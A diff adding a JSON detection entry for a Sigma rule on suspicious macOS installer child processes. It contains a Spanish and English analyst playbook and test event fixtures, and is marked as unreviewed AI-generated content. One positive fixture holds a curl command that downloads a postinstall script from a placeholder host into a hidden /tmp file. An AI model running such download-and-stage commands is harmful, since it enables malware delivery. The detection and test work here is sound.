@@ -1,0 +1,133 @@
+{
+  "rule": {
+    "id": "e0cfaecd-602d-41af-988d-f6ccebb2af26",
+    "title": "Suspicious Installer Package Child Process",
+    "level": "medium",
+    "status": "test",
+    "author": "Sohan G (D4rkCiph3r)",
+    "path": "macos/process_creation/proc_creation_macos_installer_susp_child_process.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/macos/process_creation/proc_creation_macos_installer_susp_child_process.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059",
+      "T1059.007",
+      "T1071",
+      "T1071.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso del instalador de paquetes de macOS (installer o package_script_service) lanzó un intérprete o una herramienta de descarga para ejecutar un script preinstall o postinstall. Puede ser un instalador legítimo o un paquete .pkg malicioso que ejecuta código o descarga un payload.",
+      "what_it_detects": "Eventos de creación de procesos en macOS donde ParentImage termina en /installer o /package_script_service, Image es un shell, intérprete (python, ruby, perl, php, osascript, JXA, tclsh) o curl/wget, y CommandLine contiene 'preinstall' o 'postinstall'.",
+      "why_it_matters": "Los paquetes .pkg ejecutan scripts con privilegios elevados durante la instalación. Los atacantes los usan para ejecutar comandos (T1059, T1059.007 JavaScript/JXA) y contactar servidores de C2 por HTTP (T1071.001).",
+      "triage_steps": [
+        "Revise CommandLine completo: identifique la ruta del script (PKInstallSandbox/Scripts), el nombre del paquete y cualquier URL, dominio o IP incluidos.",
+        "Determine qué .pkg se instaló: busque en /var/log/install.log del host el paquete, su identificador y la hora de instalación.",
+        "Verifique la firma del paquete con pkgutil --check-signature y el estado de notarización; un paquete sin firmar o de un desarrollador desconocido aumenta la sospecha.",
+        "Revise los procesos hijos del intérprete en el mismo host +/- 15 minutos: descargas con curl/wget, osascript mostrando diálogos de contraseña, binarios ejecutados desde /tmp o /Users/Shared.",
+        "Busque persistencia creada en esa ventana: nuevos LaunchAgents o LaunchDaemons en ~/Library y /Library, y elementos de inicio de sesión.",
+        "Correlacione conexiones de red del host hacia dominios o IPs vistos en CommandLine y consulte su reputación.",
+        "Identifique al usuario que inició la instalación y cómo obtuvo el paquete (navegador, correo, mensajería); busque alertas previas para el mismo host o usuario."
+      ],
+      "false_positives": [
+        "Software legítimo que usa scripts preinstall/postinstall para configurar servicios, permisos o componentes, por ejemplo herramientas de desarrollo, VPN o agentes de seguridad.",
+        "Instalaciones distribuidas por MDM (Jamf, Intune, Munki) que ejecutan scripts y descargan componentes adicionales con curl.",
+        "Paquetes internos firmados por el equipo de TI de la organización."
+      ],
+      "response_steps": [
+        "Si el paquete está firmado por un proveedor conocido y el comportamiento es coherente, documente y considere una exclusión por identificador de paquete y firma.",
+        "Si es sospechoso, aísle el endpoint mediante el EDR y preserve el .pkg, install.log y los archivos descargados para análisis.",
+        "Bloquee los dominios, IPs y hashes identificados en proxy, DNS y EDR; busque los mismos indicadores en otros hosts.",
+        "Elimine la persistencia y los binarios confirmados como maliciosos, rote credenciales del usuario si hubo diálogos de contraseña, y restaure el equipo tras la validación."
+      ],
+      "severity_rationale": "Nivel medio porque los scripts de instalación son comunes en software legítimo, pero un intérprete o curl lanzado desde ellos es un vector conocido de ejecución y descarga de malware."
+    },
+    "en": {
+      "summary": "A macOS installer process (installer or package_script_service) launched an interpreter or download tool to run a preinstall or postinstall script. This may be a legitimate installer or a malicious .pkg running code or fetching a payload.",
+      "what_it_detects": "macOS process creation events where ParentImage ends in /installer or /package_script_service, Image is a shell, interpreter (python, ruby, perl, php, osascript, JXA, tclsh) or curl/wget, and CommandLine contains 'preinstall' or 'postinstall'.",
+      "why_it_matters": "Package scripts run with elevated privileges during installation. Attackers abuse them to execute commands (T1059, T1059.007 JavaScript/JXA) and reach C2 servers over HTTP (T1071.001).",
+      "triage_steps": [
+        "Read the full CommandLine: note the script path (PKInstallSandbox/Scripts), the package name and any URL, domain or IP.",
+        "Identify the installed .pkg: check /var/log/install.log on the host for the package, its identifier and install time.",
+        "Check the package signature with pkgutil --check-signature and notarization status; unsigned or unknown-developer packages raise suspicion.",
+        "Review child processes on the same host +/- 15 minutes: curl/wget downloads, osascript password prompts, binaries run from /tmp or /Users/Shared.",
+        "Look for persistence created in that window: new LaunchAgents or LaunchDaemons in ~/Library and /Library, and login items.",
+        "Correlate host network connections to domains or IPs seen in CommandLine and check their reputation.",
+        "Identify the user who ran the install and how the package arrived (browser, email, chat); check earlier alerts for the same host or user."
+      ],
+      "false_positives": [
+        "Legitimate software using preinstall/postinstall scripts to configure services, permissions or components, such as developer tools, VPN clients or security agents.",
+        "MDM-deployed installs (Jamf, Intune, Munki) that run scripts and fetch extra components with curl.",
+        "Internal packages signed by the organization's IT team."
+      ],
+      "response_steps": [
+        "If the package is signed by a known vendor and behavior is consistent, document it and consider an exclusion by package identifier and signature.",
+        "If suspicious, isolate the endpoint via EDR and preserve the .pkg, install.log and downloaded files for analysis.",
+        "Block identified domains, IPs and hashes in proxy, DNS and EDR; hunt for the same indicators on other hosts.",
+        "Remove confirmed persistence and malicious binaries, rotate user credentials if password prompts appeared, and restore the host after validation."
+      ],
+      "severity_rationale": "Medium because installer scripts are common in legitimate software, yet an interpreter or curl launched from them is a known malware execution and download vector."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "package_script_service runs bash on a preinstall script from an unsigned package",
+        "event": {
+          "Computer": "MAC-0142",
+          "User": "root",
+          "ParentImage": "/System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/Resources/package_script_service",
+          "Image": "/bin/bash",
+          "CommandLine": "/bin/bash /tmp/PKInstallSandbox.a1B2c3/Scripts/com.example.updater.pkg.Xy12/preinstall /Users/jperez/Downloads/Updater.pkg / / /",
+          "ProcessId": 4821,
+          "ParentProcessId": 4790
+        }
+      },
+      {
+        "description": "installer spawns curl to fetch a postinstall payload",
+        "event": {
+          "Computer": "MAC-0142",
+          "User": "root",
+          "ParentImage": "/usr/sbin/installer",
+          "Image": "/usr/bin/curl",
+          "CommandLine": "/usr/bin/curl -fsSL https://update.example.com/postinstall.sh -o /tmp/.p.sh",
+          "ProcessId": 4901,
+          "ParentProcessId": 4880
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Installer script run by zsh, which is not in the Image list (/bin/zsh does not end with /sh)",
+        "event": {
+          "Computer": "MAC-0142",
+          "User": "root",
+          "ParentImage": "/System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/Resources/package_script_service",
+          "Image": "/bin/zsh",
+          "CommandLine": "/bin/zsh /tmp/PKInstallSandbox.d4E5f6/Scripts/com.example.vpn.pkg.Ab34/postinstall /Library/Packages/VPN.pkg / / /",
+          "ProcessId": 5120,
+          "ParentProcessId": 5101
+        }
+      },
+      {
+        "description": "bash launched by package_script_service for a helper script without preinstall/postinstall in the command line",
+        "event": {
+          "Computer": "MAC-0207",
+          "User": "root",
+          "ParentImage": "/System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/Resources/package_script_service",
+          "Image": "/bin/bash",
+          "CommandLine": "/bin/bash /tmp/PKInstallSandbox.g7H8i9/Scripts/com.example.agent.pkg.Cd56/check_version.sh",
+          "ProcessId": 6230,
+          "ParentProcessId": 6211
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:13+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
